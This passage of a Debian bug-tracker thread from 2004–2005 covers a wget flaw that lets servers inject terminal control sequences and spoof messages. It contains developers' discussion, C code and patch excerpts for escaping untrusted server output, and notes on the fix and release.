end-delimiter is ``END_QUOT\n''.  The begin-delimiter will work good,
regardless of the BEGIN_QUOT value.  The only problem is we can't really
tell whether it was the *remote server*, or some third party (attacker),
who originated the message.  If someone could come up with a more
appropriate phrase, I'd be pleased.  The end-delimiter and any similar
glyphs (locale-dependent) will be escaped in the server-response, so
that it can't be spoofed.  As we will never know which characters look
similar in a given font/locale combination, therefore we can never be
100% confident we are secure against spoofing.  This, too, can be
implemented right ahead.

I chose ">>>"/"<<<" (and not e.g. '"') for BEGIN_QUOT/END_QUOT precisely
because it is not used anywhere in wget, and it looks strange, so to
pinpoint the message is not from us, but from some strange untrusted
source.  ">>>" BTW is the python shell prompt.

(III) Marking the server-responses in an obvious and intuitive way

Hard if not impossible.  Who cares about missing end-delimiter?  When a
text starts in column 0, it looks like coming from the running program,
no matter what.  You'd have to either turn the wrapping off, or you have
to know the width of the display.  Or you can draw a border around the
whole message (horrible, and space-wasting).

We could collapse the end-delimiter just to ``\n'', and to split the
server-response in among multiple lines, prepending the begin-delimiter
and the (possibly different) begin-delimiter-continuation, before every
one.  Then, we could leave out BEGIN_QUOT, too.  This is likely to break
some existing software.  The tricky part is to get the display width
*reliably*.  We can't just default to 80, as this would present a
problem for terminals with the actual width <80.  We could simply output
an error message and print *no* server-response.  We could have our own
built-in dictionary of standard error number interpretations.

(IV) Making it impossible to fool a casual user

This is impossible.  There will always people that would be vulnerable
because of bad luck, stupidity, poor language knowledge, etc.

> >                                                       To increase
> > backwards compatibility, it's probably best to add the quotes only if
> > potentially harmful characters are actually contained in the server
> > response.

Three points here:

(a) The user should get used to the format; this would improve
his/her confidence that what s/he sees is what s/he think it is.

(b) Any message above the numeric code is potentially dangerous; we are
talking social engineering here: we must make clear the message is *not
from us*.

(c) You are right that the original patch would break existing software,
so the new suggestion is to quote the free-form part of the server
response, and let the numeric code as it is.

	_("%s ERROR %d: Remote server said: >>> %s <<<.\n"),
	           ^^^
Please keep me CC'd.

Jan.

--
   "To me, clowns aren't funny. In fact, they're kind of scary. I've wondered
 where this started and I think it goes back to the time I went to the circus,
			  and a clown killed my dad."

```
```
[[Message part 2](bugreport.cgi?att=1;bug=261755;msg=25) (application/pgp-signature, inline)]
```

---

**Information forwarded** to `debian-bugs-dist@lists.debian.org, Noèl Köthe <noel@debian.org>`:

`Bug#261755`; Package `wget`.
([full text](bugreport.cgi?bug=261755;msg=27), [mbox](bugreport.cgi?bug=261755;mbox=yes;msg=27), [link](#26)).

---

**Acknowledgement sent** to `Thomas Hood <jdthood@aglu.demon.nl>`:

Extra info received and forwarded to list. Copy sent to `Noèl Köthe <noel@debian.org>`.
([full text](bugreport.cgi?bug=261755;msg=29), [mbox](bugreport.cgi?bug=261755;mbox=yes;msg=29), [link](#28)).

---

[Message #30](#30) received at 261755@bugs.debian.org ([full text](bugreport.cgi?bug=261755;msg=30), [mbox](bugreport.cgi?bug=261755;mbox=yes;msg=30), reply):

![](/cgi-bin/libravatar.cgi?email=jdthood%40aglu.demon.nl)
From: Thomas Hood <jdthood@aglu.demon.nl>
To: 261755-submitter@bugs.debian.org, 261755@bugs.debian.org
Cc: Florian Weimer <fw@deneb.enyo.de>
Subject: Can this be fixed in time for sarge?
Date: Sun, 22 Aug 2004 11:39:07 +0200
```
The changes contemplated look very invasive.  How quickly can this
bug be fixed?
--
Thomas Hood

```

---

**Message sent on** to `Jan Minar <jjminar@fastmail.fm>`:

Bug#261755.
([full text](bugreport.cgi?bug=261755;msg=32), [mbox](bugreport.cgi?bug=261755;mbox=yes;msg=32), [link](#31)).

---

**Information stored**:

`Bug#261755`; Package `wget`.
([full text](bugreport.cgi?bug=261755;msg=35), [mbox](bugreport.cgi?bug=261755;mbox=yes;msg=35), [link](#34)).

---

**Acknowledgement sent** to `Jan Minar <jjminar@fastmail.fm>`:

Extra info received and filed, but not forwarded.
([full text](bugreport.cgi?bug=261755;msg=37), [mbox](bugreport.cgi?bug=261755;mbox=yes;msg=37), [link](#36)).

---

[Message #38](#38) received at 261755-quiet@bugs.debian.org ([full text](bugreport.cgi?bug=261755;msg=38), [mbox](bugreport.cgi?bug=261755;mbox=yes;msg=38), reply):

![](/cgi-bin/libravatar.cgi?email=jjminar%40fastmail.fm)
From: Jan Minar <jjminar@fastmail.fm>
To: Thomas Hood <jdthood@aglu.demon.nl>, 261755-quiet@bugs.debian.org
Subject: Re: Bug#261755: Can this be fixed in time for sarge?
Date: Sun, 22 Aug 2004 13:12:43 +0200
```
[[Message part 1](bugreport.cgi?att=0;bug=261755;msg=38) (text/plain, inline)]
```
```
On Sun, Aug 22, 2004 at 11:39:07AM +0200, Thomas Hood wrote:
> The changes contemplated look very invasive.  How quickly can this
> bug be fixed?

It looks like we'd have to go thru the whole code, sanitizing all calls
to logprintf() where a tainted variable is involved.  This is tedious.

I'm leaning towards solving the control-chars injection by a wrapper
that would filter these.  I can't think of no such workaround for the
spoofing vulnerability.

J.

--
   "To me, clowns aren't funny. In fact, they're kind of scary. I've wondered
 where this started and I think it goes back to the time I went to the circus,
			  and a clown killed my dad."

```
```
[[Message part 2](bugreport.cgi?att=1;bug=261755;msg=38) (application/pgp-signature, inline)]
```

---

**Information stored**:

`Bug#261755`; Package `wget`.
([full text](bugreport.cgi?bug=261755;msg=40), [mbox](bugreport.cgi?bug=261755;mbox=yes;msg=40), [link](#39)).

---

**Acknowledgement sent** to `Jan Minar <jjminar@fastmail.fm>`:

Extra info received and filed, but not forwarded.
([full text](bugreport.cgi?bug=261755;msg=42), [mbox](bugreport.cgi?bug=261755;mbox=yes;msg=42), [link](#41)).

---

[Message #43](#43) received at 261755-quiet@bugs.debian.org ([full text](bugreport.cgi?bug=261755;msg=43), [mbox](bugreport.cgi?bug=261755;mbox=yes;msg=43), reply):

![](/cgi-bin/libravatar.cgi?email=jjminar%40fastmail.fm)
From: Jan Minar <jjminar@fastmail.fm>
To: Thomas Hood <jdthood@aglu.demon.nl>, 261755-quiet@bugs.debian.org
Subject: Re: Bug#261755: Can this be fixed in time for sarge?
Date: Sun, 22 Aug 2004 13:32:12 +0200
```
[[Message part 1](bugreport.cgi?att=0;bug=261755;msg=43) (text/plain, inline)]
```
```
On Sun, Aug 22, 2004 at 01:12:43PM +0200, Jan Minar wrote:
> I'm leaning towards solving the control-chars injection by a wrapper
> that would filter these.  I can't think of no such workaround for the
> spoofing vulnerability.

Here's the script:

--- /dev/null	Wed Dec 10 03:42:57 2003
+++ /home/jan/bin/wget	Sun Aug 22 13:18:19 2004
@@ -0,0 +1,6 @@
+#!/bin/sh
+# ~jan/bin/wget -- wget wrapper that'll get rid of the escape sequences
+
+WGET=/usr/bin/wget
+
+"$WGET" -o /dev/fd/1 "$@" | filter-controls

Here's the filter-controls source:

--- /dev/null	Wed Dec 10 03:42:57 2003
+++ /home/jan/code/filter-controls/filter-controls.c	Tue Aug 17 01:50:28 2004
@@ -0,0 +1,43 @@
+#include <stdio.h>
+#include <ctype.h>
+#include <stdlib.h>
+
+void my_putchar(char);
+
+/* my_putchar(char) error-checking putchar() wrapper */
+/* DNW: Somehow echo hello | ./filter-controls > /dev/full returns 0. */
+inline void
+my_putchar (char c) {
+	if (putchar (c) == EOF) {
+		perror ("Error writing to stdout");
+		exit (1);
+	}
+}
+
+int
+main (void)
+{
+	int c;
+	int last_was_space = 0;
+
+	setbuf (stdout, NULL);
+
+	while ((c = getchar()) != EOF) {
+		if (isgraph(c) || c == '\n') {
+			my_putchar (c);
+			last_was_space = 0;
+		} else if (isspace (c)) {
+			if (last_was_space == 0)
+				my_putchar (' ');
+			last_was_space = 1;
+		} else  {
+			my_putchar ('\\');
+			my_putchar ('0' + ((c & 0xff) >> 6));
+			my_putchar ('0' + ((c & 0x3f) >> 3));
+			my_putchar ('0' + (c & 7));
+
+			last_was_space = 0;
+		}
+	}
+	return 0;
+}

Of course the script is not necessary; I only didn't want to learn
setting up pipes in C.

The problem here is, we lose the nice progress bar, getting the tedious
dot-progress interface instead.  Nobody will like this.  So maybe
hooking/rewriting the logprintf() function will be an option, although
I don't like it.

Jan.

--
   "To me, clowns aren't funny. In fact, they're kind of scary. I've wondered
 where this started and I think it goes back to the time I went to the circus,
			  and a clown killed my dad."

```
```
[[Message part 2](bugreport.cgi?att=1;bug=261755;msg=43) (application/pgp-signature, inline)]
```

---

**Information forwarded** to `debian-bugs-dist@lists.debian.org, Noèl Köthe <noel@debian.org>`:

`Bug#261755`; Package `wget`.
([full text](bugreport.cgi?bug=261755;msg=45), [mbox](bugreport.cgi?bug=261755;mbox=yes;msg=45), [link](#44)).

---

**Acknowledgement sent** to `Jan Minar <jjminar@fastmail.fm>`:

Extra info received and forwarded to list. Copy sent to `Noèl Köthe <noel@debian.org>`.
([full text](bugreport.cgi?bug=261755;msg=47), [mbox](bugreport.cgi?bug=261755;mbox=yes;msg=47), [link](#46)).

---

[Message #48](#48) received at 261755@bugs.debian.org ([full text](bugreport.cgi?bug=261755;msg=48), [mbox](bugreport.cgi?bug=261755;mbox=yes;msg=48), reply):

![](/cgi-bin/libravatar.cgi?email=jjminar%40fastmail.fm)
From: Jan Minar <jjminar@fastmail.fm>
To: Thomas Hood <jdthood@aglu.demon.nl>, 261755@bugs.debian.org
Cc: control@bugs.debian.org, bug-wget@gnu.org
Subject: Re: Bug#261755: Control sequences injection patch
Date: Sun, 22 Aug 2004 20:02:54 +0200
```
[[Message part 1](bugreport.cgi?att=0;bug=261755;msg=48) (text/plain, inline)]
```
```
tags 261755 +patch
thanks

On Sun, Aug 22, 2004 at 11:39:07AM +0200, Thomas Hood wrote:
> The changes contemplated look very invasive.  How quickly can this
> bug be fixed?

Here we go:  Hacky, non-portable, but pretty slick & non-invasive,
whatever that means.  Now I'm going to check whether it is going to
catch all the cases where malicious characters could be possibly
injected.

This patch (hopefully) solves the problem of remote attacker (server or
otherwise) injects malicious control sequences in the HTTP headers.  It
by no mean solves the spoofing bug, which is by nature tricky to address
well.

Cheers,
Jan.

--
   "To me, clowns aren't funny. In fact, they're kind of scary. I've wondered
 where this started and I think it goes back to the time I went to the circus,
			  and a clown killed my dad."

```
```
[[wget-filter-controls.patch](bugreport.cgi?att=1;bug=261755;filename=wget-filter-controls.patch;msg=48) (text/plain, attachment)]
```
```
[[Message part 3](bugreport.cgi?att=2;bug=261755;msg=48) (application/pgp-signature, inline)]
```

---

**Tags added: patch**
Request was from `Jan Minar <jjminar@fastmail.fm>`
to `control@bugs.debian.org`.
([full text](bugreport.cgi?bug=261755;msg=50), [mbox](bugreport.cgi?bug=261755;mbox=yes;msg=50), [link](#49)).

---

**Information forwarded** to `debian-bugs-dist@lists.debian.org, Noèl Köthe <noel@debian.org>`:

`Bug#261755`; Package `wget`.
([full text](bugreport.cgi?bug=261755;msg=52), [mbox](bugreport.cgi?bug=261755;mbox=yes;msg=52), [link](#51)).

---

**Acknowledgement sent** to `Jan Minar <jjminar@fastmail.fm>`:

Extra info received and forwarded to list. Copy sent to `Noèl Köthe <noel@debian.org>`.
([full text](bugreport.cgi?bug=261755;msg=54), [mbox](bugreport.cgi?bug=261755;mbox=yes;msg=54), [link](#53)).

---

[Message #55](#55) received at 261755@bugs.debian.org ([full text](bugreport.cgi?bug=261755;msg=55), [mbox](bugreport.cgi?bug=261755;mbox=yes;msg=55), reply):

![](/cgi-bin/libravatar.cgi?email=jjminar%40fastmail.fm)
From: Jan Minar <jjminar@fastmail.fm>
To: Thomas Hood <jdthood@aglu.demon.nl>, 261755@bugs.debian.org,
bug-wget@gnu.org
Subject: Re: Bug#261755: Control sequences injection patch
Date: Tue, 24 Aug 2004 03:11:28 +0200
```
[[Message part 1](bugreport.cgi?att=0;bug=261755;msg=55) (text/plain, inline)]
```
```
On Sun, Aug 22, 2004 at 08:02:54PM +0200, Jan Minar wrote:
> +/* vasprintf() requires _GNU_SOURCE.  Which is OK with Debian. */
> +#ifndef _GNU_SOURCE
> +#define _GNU_SOURCE

This must be done before stdio.h is included.

> +#endif
> +#include <ctype.h>
> +
>  #ifndef errno
>  extern int errno;
>  #endif
> @@ -345,7 +351,49 @@
>    int expected_size;
>    int allocated;
>  };
> +
> +/* XXX Where does the declaration belong?? */
> +void escape_buffer (char **src);
>
> +/*
> + * escape_untrusted  -- escape using '\NNN'.  To be used wherever we want to
> + * print untrusted data.
> + *
> + * Syntax: escape_buffer (&buf-to-escape);
> + */
> +void escape_buffer (char **src)
> +{
> +	char *dest;
> +	int i, j;
> +
> +	/* We encode each byte using at most 4 bytes, + trailing '\0'. */
> +	dest = xmalloc (4 * strlen (*src) + 1);
> +
> +	for (i = j = 0; (*src)[i] != '\0'; ++i) {
> +		/*
> +		 * We allow any non-control character, because LINE TABULATION
> +		 * & friends can't do more harm than SPACE.  And someone
> +		 * somewhere might be using these, so unless we actually can't
> +		 * protect against spoofing attacks, we don't pretend we can.
> +		 *
> +		 * Note that '\n' is included both in the isspace() *and*
> +		 * iscntrl() range.
> +		 */
> +		if (isprint((*src)[i]) || isspace((*src)[i])) {

This lets '\r' thru, not good.  BTW, (*src)[i] is quite a cypher.

> +			dest[j++] = (*src)[i];
> +		} else {
> +			dest[j++] = '\\';
> +			dest[j++] = '0' + (((*src)[i] & 0xff) >> 6);
> +			dest[j++] = '0' + (((*src)[i] & 0x3f) >> 3);
> +			dest[j++] = '0' + ((*src)[i] & 7);
> +		}
> +	}
> +	dest[j] = '\0';
> +
> +	xfree (*src);
> +	*src = dest;
> +}

Attached is version 2, which solves these problems.

Please keep me CC'd.

Jan.

--
   "To me, clowns aren't funny. In fact, they're kind of scary. I've wondered
 where this started and I think it goes back to the time I went to the circus,
			  and a clown killed my dad."

```
```
[[wget-filter-controls.patch.v2](bugreport.cgi?att=1;bug=261755;filename=wget-filter-controls.patch.v2;msg=55) (text/plain, attachment)]
```
```
[[Message part 3](bugreport.cgi?att=2;bug=261755;msg=55) (application/pgp-signature, inline)]
```

---

**Reply sent** to `Noèl Köthe <noel@debian.org>`:

You have taken responsibility.
([full text](bugreport.cgi?bug=261755;msg=57), [mbox](bugreport.cgi?bug=261755;mbox=yes;msg=57), [link](#56)).

---

**Notification sent** to `Jan Minar <jjminar@fastmail.fm>`:

Bug acknowledged by developer.
([full text](bugreport.cgi?bug=261755;msg=59), [mbox](bugreport.cgi?bug=261755;mbox=yes;msg=59), [link](#58)).

---

[Message #60](#60) received at 261755-close@bugs.debian.org ([full text](bugreport.cgi?bug=261755;msg=60), [mbox](bugreport.cgi?bug=261755;mbox=yes;msg=60), reply):

![](/cgi-bin/libravatar.cgi?email=noel%40debian.org)
From: Noèl Köthe <noel@debian.org>
To: 261755-close@bugs.debian.org
Subject: Bug#261755: fixed in wget 1.9.1-5
Date: Mon, 13 Sep 2004 17:32:08 -0400
```
Source: wget
Source-Version: 1.9.1-5

We believe that the bug you reported is fixed in the latest version of
wget, which is due to be installed in the Debian FTP archive:

wget_1.9.1-5.diff.gz
  to pool/main/w/wget/wget_1.9.1-5.diff.gz
wget_1.9.1-5.dsc
  to pool/main/w/wget/wget_1.9.1-5.dsc
wget_1.9.1-5_i386.deb
  to pool/main/w/wget/wget_1.9.1-5_i386.deb

A summary of the changes between this version and the previous one is
attached.

Thank you for reporting the bug, which will now be closed.  If you
have further comments please address them to 261755@bugs.debian.org,
and the maintainer will reopen the bug report if appropriate.

Debian distribution maintenance software
pp.
Noèl Köthe <noel@debian.org> (supplier of updated wget package)

(This message was generated automatically at their request; if you
believe that there is a problem with it please contact the archive
administrators by mailing ftpmaster@debian.org)

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

Format: 1.7
Date: Mon, 13 Sep 2004 22:55:58 +0200
Source: wget
Binary: wget
Architecture: source i386
Version: 1.9.1-5
Distribution: unstable
Urgency: high
Maintainer: Noèl Köthe <noel@debian.org>
Changed-By: Noèl Köthe <noel@debian.org>
Description:
 wget       - retrieves files from the web
Closes: [197916](bugreport.cgi?bug=197916) [261755](bugreport.cgi?bug=261755)
Changes:
 wget (1.9.1-5) unstable; urgency=high
 .
   * added patch from Jan Minar <jjminar fastmail.fm> which corrects
     the parsing/filtering of answer from servers
     (Thanks alot for your help Jan!)
     (closes: Bug#[261755](bugreport.cgi?bug=261755))
   * documenting incompatibility of -k and -O
     (closes: Bug#[197916](bugreport.cgi?bug=197916))
Files:
 4543b701997bcb32529c78606b8e4081 596 web optional wget_1.9.1-5.dsc
 2d9081bcbe108e443be4ed8f9c465537 11752 web optional wget_1.9.1-5.diff.gz
 beb626e0a77a3eb9ed85bfdd89a1d800 424634 web optional wget_1.9.1-5_i386.deb

-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.2.5 (GNU/Linux)

iD8DBQFBRgnL9/DnDzB9Vu0RAgE9AJ4nVAzUfQiHJrur2Eo1K4F8AFu3TACeMkpk
hMpSnjKIKfMR7TrYcRVns6o=
=hWNT
-----END PGP SIGNATURE-----

```

---

**Information forwarded** to `debian-bugs-dist@lists.debian.org, Noèl Köthe <noel@debian.org>`:

`Bug#261755`; Package `wget`.
([full text](bugreport.cgi?bug=261755;msg=62), [mbox](bugreport.cgi?bug=261755;mbox=yes;msg=62), [link](#61)).

---

**Acknowledgement sent** to `Tomas Pospisek <tpo@sourcepole.ch>`:

Extra info received and forwarded to list. Copy sent to `Noèl Köthe <noel@debian.org>`.
([full text](bugreport.cgi?bug=261755;msg=64), [mbox](bugreport.cgi?bug=261755;mbox=yes;msg=64), [link](#63)).

---

[Message #65](#65) received at 261755@bugs.debian.org ([full text](bugreport.cgi?bug=261755;msg=65), [mbox](bugreport.cgi?bug=261755;mbox=yes;msg=65), reply):

![](/cgi-bin/libravatar.cgi?email=tpo%40sourcepole.ch)
From: Tomas Pospisek <tpo@sourcepole.ch>
To: 261755@bugs.debian.org
Cc: jjminar@fastmail.fm
Subject: wget sid->sarge
Date: Sun, 26 Sep 2004 00:26:48 +0200 (CEST)
```
I'm going through the list of packages that are pending to transition from
sid->sarge in order to tag them for manual propagation [1]. I've seen that
wget in sid fixes a security issue [2] (no sanitizing of server
responses). Question:

* I don't really understand the bug's security implications. Should
  sid's fixed wget be propagated to sarge?
* Does fix all the issues present in the code?

*t

[1] <http://www.wolffelaar.nl/~sarge/>
[2] <http://bugs.debian.org/261755>

--
--------------------------------------------------------
  Tomas Pospisek
  <http://sourcepole.com> -  Linux & Open Source Solutions
--------------------------------------------------------

```

---

**Information forwarded** to `debian-bugs-dist@lists.debian.org, Noèl Köthe <noel@debian.org>`:

`Bug#261755`; Package `wget`.
([full text](bugreport.cgi?bug=261755;msg=67), [mbox](bugreport.cgi?bug=261755;mbox=yes;msg=67), [link](#66)).

---

**Acknowledgement sent** to `Noèl Köthe <noel@debian.org>`:

Extra info received and forwarded to list. Copy sent to `Noèl Köthe <noel@debian.org>`.
([full text](bugreport.cgi?bug=261755;msg=69), [mbox](bugreport.cgi?bug=261755;mbox=yes;msg=69), [link](#68)).

---

[Message #70](#70) received at 261755@bugs.debian.org ([full text](bugreport.cgi?bug=261755;msg=70), [mbox](bugreport.cgi?bug=261755;mbox=yes;msg=70), reply):

![](/cgi-bin/libravatar.cgi?email=noel%40debian.org)
From: Noèl Köthe <noel@debian.org>
To: Tomas Pospisek <tpo@sourcepole.ch>, 261755@bugs.debian.org
Cc: jjminar@fastmail.fm
Subject: Re: Bug#261755: wget sid->sarge
Date: Mon, 27 Sep 2004 16:29:02 +0200
```
[[Message part 1](bugreport.cgi?att=0;bug=261755;msg=70) (text/plain, inline)]
```
```
Am Sonntag, den 26.09.2004, 00:26 +0200 schrieb Tomas Pospisek:
> I'm going through the list of packages that are pending to transition from
> sid->sarge in order to tag them for manual propagation [1]. I've seen that
> wget in sid fixes a security issue [2] (no sanitizing of server
> responses). Question:
>
> * I don't really understand the bug's security implications. Should
>    sid's fixed wget be propagated to sarge?
> * Does fix all the issues present in the code?

it opens this problem: #271931
Thats the reason why I didn't asked for moving it from sid to sarge.
sadly upstream is not available since some weeks to discuss this
problem.:(

--
Noèl Köthe <noel debian.org>
Debian GNU/Linux, www.debian.org

```
```
[[signature.asc](bugreport.cgi?att=1;bug=261755;filename=signature.asc;msg=70) (application/pgp-signature, inline)]
```

---

**Information forwarded** to `debian-bugs-dist@lists.debian.org, Noèl Köthe <noel@debian.org>`:

`Bug#261755`; Package `wget`.
([full text](bugreport.cgi?bug=261755;msg=72), [mbox](bugreport.cgi?bug=261755;mbox=yes;msg=72), [link](#71)).

---

**Acknowledgement sent** to `Tomas Pospisek <tpo_deb2@sourcepole.ch>`:

Extra info received and forwarded to list. Copy sent to `Noèl Köthe <noel@debian.org>`.
([full text](bugreport.cgi?bug=261755;msg=74), [mbox](bugreport.cgi?bug=261755;mbox=yes;msg=74), [link](#73)).

---

[Message #75](#75) received at 261755@bugs.debian.org ([full text](bugreport.cgi?bug=261755;msg=75), [mbox](bugreport.cgi?bug=261755;mbox=yes;msg=75), reply):

![](/cgi-bin/libravatar.cgi?email=tpo_deb2%40sourcepole.ch)
From: Tomas Pospisek <tpo\_deb2@sourcepole.ch>
To: 261755@bugs.debian.org
Cc: jjminar@fastmail.fm, 271931@bugs.debian.org
Subject: Re: Bug#261755: wget sid->sarge
Date: Mon, 27 Sep 2004 17:19:27 +0200 (CEST)
```
[[Message part 1](bugreport.cgi?att=0;bug=261755;msg=75) (text/plain, inline)]
```
```
On Mon, 27 Sep 2004, Noèl Köthe wrote:

> Am Sonntag, den 26.09.2004, 00:26 +0200 schrieb Tomas Pospisek:
>> I'm going through the list of packages that are pending to transition from
>> sid->sarge in order to tag them for manual propagation [1]. I've seen that
>> wget in sid fixes a security issue [2] (no sanitizing of server
>> responses). Question:
>>
>> * I don't really understand the bug's security implications. Should
>>    sid's fixed wget be propagated to sarge?
>> * Does fix all the issues present in the code?
>
> it opens this problem: #271931
> Thats the reason why I didn't asked for moving it from sid to sarge.
> sadly upstream is not available since some weeks to discuss this
> problem.:(

OK, I've put that info into the release helping system [1]. Please update
it when the problem is fixed or let me know.
*t

[1] I don't know if the following link will work:
    <http://www.wolffelaar.nl/~sarge/?PHPSESSID=f957b02aa24b1a4ab9237ae4e80df6a9&package=wget&maint=&outofsync=&frozen=&status=>
    Otherwise just visit <http://www.wolffelaar.nl/~sarge/>,
    enter wget in the first field and press return.

--
--------------------------------------------------------
  Tomas Pospisek
  <http://sourcepole.com> -  Linux & Open Source Solutions
--------------------------------------------------------
```

---

**Information forwarded** to `debian-bugs-dist@lists.debian.org, Noèl Köthe <noel@debian.org>`:

`Bug#261755`; Package `wget`.
([full text](bugreport.cgi?bug=261755;msg=77), [mbox](bugreport.cgi?bug=261755;mbox=yes;msg=77), [link](#76)).

---

**Acknowledgement sent** to `Jan Minar <jjminar@fastmail.fm>`:

Extra info received and forwarded to list. Copy sent to `Noèl Köthe <noel@debian.org>`.
([full text](bugreport.cgi?bug=261755;msg=79), [mbox](bugreport.cgi?bug=261755;mbox=yes;msg=79), [link](#78)).

---

[Message #80](#80) received at 261755@bugs.debian.org ([full text](bugreport.cgi?bug=261755;msg=80), [mbox](bugreport.cgi?bug=261755;mbox=yes;msg=80), reply):

![](/cgi-bin/libravatar.cgi?email=jjminar%40fastmail.fm)
From: Jan Minar <jjminar@fastmail.fm>
To: 261755@bugs.debian.org
Cc: 261755-submitter@bugs.debian.org,
ismail donmez <kde@myrealbox.com>
Subject: wget: Indiscriminate escaping in multibyte locales patch -- review required
Date: Tue, 28 Sep 2004 21:41:54 +0200
```
[[Message part 1](bugreport.cgi?att=0;bug=261755;msg=80) (text/plain, inline)]
```
```
Hi all!

Sorry for not making the patch right the first (or was it second?) time.
And thank Ambrose and Ismail for reporting the bug and commenting upon
it.

I rewrote the patch to be multibyte-aware, please test it and/or review
it.  When I say please review it, I mean it, because the wchar API is
really not my cup of tea, and I probably made silly mistakes and
introduced new and interesting problems.

This new patch introduces no difference in what is printed when ``wget
localhost'' is run, at least under cs_CZ.UTF-8, zh_CN.gb18030,
zh_CN.gb2312, zh_CN.gbk, and ja_JP.eucjp locales.

BTW: Does anybody know why is upstream completely ignoring this issue?

Cheers,
--
Jan

```
```
[[wget-filter-controls.patch.v3--multibyte-aware](bugreport.cgi?att=1;bug=261755;filename=wget-filter-controls.patch.v3--multibyte-aware;msg=80) (text/plain, attachment)]
```
```
[[Message part 3](bugreport.cgi?att=2;bug=261755;msg=80) (application/pgp-signature, inline)]
```

---

**Message sent on** to `Jan Minar <jjminar@fastmail.fm>`:

Bug#261755.
([full text](bugreport.cgi?bug=261755;msg=82), [mbox](bugreport.cgi?bug=261755;mbox=yes;msg=82), [link](#81)).

---

**Information forwarded** to `debian-bugs-dist@lists.debian.org, Noèl Köthe <noel@debian.org>`:

`Bug#261755`; Package `wget`.
([full text](bugreport.cgi?bug=261755;msg=85), [mbox](bugreport.cgi?bug=261755;mbox=yes;msg=85), [link](#84)).

---

**Acknowledgement sent** to `Ismail Donmez <kde@myrealbox.com>`:

Extra info received and forwarded to list. Copy sent to `Noèl Köthe <noel@debian.org>`.
([full text](bugreport.cgi?bug=261755;msg=87), [mbox](bugreport.cgi?bug=261755;mbox=yes;msg=87), [link](#86)).

---

[Message #88](#88) received at 261755@bugs.debian.org ([full text](bugreport.cgi?bug=261755;msg=88), [mbox](bugreport.cgi?bug=261755;mbox=yes;msg=88), reply):

![](/cgi-bin/libravatar.cgi?email=kde%40myrealbox.com)
From: Ismail Donmez <kde@myrealbox.com>
To: Jan Minar <jjminar@fastmail.fm>
Cc: 261755@bugs.debian.org,
261755-submitter@bugs.debian.org
Subject: Re: wget: Indiscriminate escaping in multibyte locales patch -- review required
Date: Wed, 29 Sep 2004 19:02:09 +0300
```
On Tuesday 28 September 2004 22:41, Jan Minar wrote:
> Hi all!
>
> Sorry for not making the patch right the first (or was it second?) time.
> And thank Ambrose and Ismail for reporting the bug and commenting upon
> it.
>
> I rewrote the patch to be multibyte-aware, please test it and/or review
> it.  When I say please review it, I mean it, because the wchar API is
> really not my cup of tea, and I probably made silly mistakes and
> introduced new and interesting problems.
>
> This new patch introduces no difference in what is printed when ``wget
> localhost'' is run, at least under cs_CZ.UTF-8, zh_CN.gb18030,
> zh_CN.gb2312, zh_CN.gbk, and ja_JP.eucjp locales.
>
> BTW: Does anybody know why is upstream completely ignoring this issue?

Tested with LC_ALL=tr_TR.UTF-8 and works fine for me. Thanks for the fix!

Regards,
ismail

```

---

**Message sent on** to `Jan Minar <jjminar@fastmail.fm>`:

Bug#261755.
([full text](bugreport.cgi?bug=261755;msg=90), [mbox](bugreport.cgi?bug=261755;mbox=yes;msg=90), [link](#89)).

---

**Information forwarded** to `debian-bugs-dist@lists.debian.org, Noèl Köthe <noel@debian.org>`:

`Bug#261755`; Package `wget`.
([full text](bugreport.cgi?bug=261755;msg=93), [mbox](bugreport.cgi?bug=261755;mbox=yes;msg=93), [link](#92)).

---

**Acknowledgement sent** to `Andreas Barth <aba@not.so.argh.org>`:

Extra info received and forwarded to list. Copy sent to `Noèl Köthe <noel@debian.org>`.
([full text](bugreport.cgi?bug=261755;msg=95), [mbox](bugreport.cgi?bug=261755;mbox=yes;msg=95), [link](#94)).

---

[Message #96](#96) received at 261755@bugs.debian.org ([full text](bugreport.cgi?bug=261755;msg=96), [mbox](bugreport.cgi?bug=261755;mbox=yes;msg=96), reply):

![](/cgi-bin/libravatar.cgi?email=aba%40not.so.argh.org)
From: Andreas Barth <aba@not.so.argh.org>
To: 284875@bugs.debian.org, 261755@bugs.debian.org
Subject: wget - solving strategies
Date: Tue, 4 Jan 2005 22:03:27 +0100
```
reopen 261755
tag 261755 +sarge
thanks

Hi,

just a few annotation from me on how to make wget reach sarge. IMHO,
the current patch to 261755 is _not_ acceptable for inclusion into a
stable release, because it is too clumpsy. It is of no use to filter the
printout to the console (after adding localized characters), but the
sanitation should take part of the input stream.

Therefore, IMHO the right fix to the other bug is a prerequisite to be
able to finally release with a good version of wget.

Some annotations to the listed bugs:

Can (1) really happen in a normal scenario? According to the man page
  When running Wget without -N, -nc, or -r, downloading the same file in
  the same directory will result in the original copy of file being
  preserved and the second copy being named file.1.
So, this case will happen only if -r is specified. (Or is wget buggy to
allow the remote side to overwrite that documented behaviour?)

(2) seems to happen _exactly_ when the hostnames are created in the
directory hierarchy. This needs tackling.

(3) see my comment above.

(4) needs probably be discussed a bit more.

Cheers,
Andi
--
   <http://home.arcor.de/andreas-barth/>
   PGP 1024/89FB5CE5  DC F1 85 6D A6 45 9C 0F  3B BE F1 D0 C5 D1 D9 0C

```

---

**Bug reopened, originator not changed.**
Request was from `Andreas Barth <aba@not.so.argh.org>`
to `control@bugs.debian.org`.
([full text](bugreport.cgi?bug=261755;msg=98), [mbox](bugreport.cgi?bug=261755;mbox=yes;msg=98), [link](#97)).

---

**Information forwarded** to `debian-bugs-dist@lists.debian.org, Noèl Köthe <noel@debian.org>`:

`Bug#261755`; Package `wget`.
([full text](bugreport.cgi?bug=261755;msg=100), [mbox](bugreport.cgi?bug=261755;mbox=yes;msg=100), [link](#99)).

---

**Acknowledgement sent** to `Hrvoje Niksic <hniksic@xemacs.org>`:

Extra info received and forwarded to list. Copy sent to `Noèl Köthe <noel@debian.org>`.
([full text](bugreport.cgi?bug=261755;msg=102), [mbox](bugreport.cgi?bug=261755;mbox=yes;msg=102), [link](#101)).

---

[Message #103](#103) received at 261755@bugs.debian.org ([full text](bugreport.cgi?bug=261755;msg=103), [mbox](bugreport.cgi?bug=261755;mbox=yes;msg=103), reply):

![](/cgi-bin/libravatar.cgi?email=hniksic%40xemacs.org)
From: Hrvoje Niksic <hniksic@xemacs.org>
To: 261755@bugs.debian.org
Subject: wget: Server responses &c written to the tty verbatim (escape
sequences, control characters, ...)
Date: Thu, 05 May 2005 16:04:03 +0200
```
This bug has been fixed in CVS.  Wget filters escape sequences when
